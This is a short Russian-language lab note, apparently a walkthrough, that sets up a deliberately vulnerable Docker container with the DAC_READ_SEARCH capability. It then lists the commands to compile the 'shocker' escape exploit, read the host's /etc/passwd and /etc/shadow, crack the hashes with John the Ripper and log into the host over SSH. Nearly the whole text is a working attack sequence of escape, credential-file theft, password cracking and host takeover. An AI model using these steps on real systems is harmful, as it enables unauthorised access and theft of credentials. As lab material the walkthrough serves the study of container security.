Набор тулзов в контейнер
```bash
apt install -y vim # or any other editor
apt install -y ssh
apt install -y gcc
apt install john -y # John the Ripper password cracker package
apt install net-tools
apt install -y netcat
```

Запуск уязвимого контейнера 
```bash
sudo docker run -it --cap-add=DAC_READ_SEARCH ubuntu bash
```

Получение хэша пароля от рута
```bash
# Copy the shocker.c content
vim shocker.c
gcc -o shocker shocker.c
# Use the shocker to read files from host:./shocker /host/path /container/path
./shocker /etc/passwd passwd
./shocker /etc/shadow shadow
# Combine passwd and shadow files 
unshadow passwd shadow > password
# Use John the Ripper to crack passwords
john password
# Connect to the host with the John the ripper’s output credentials
ssh <USER-NAME>@<HOST-IP>
password: <password from john’s output>
```
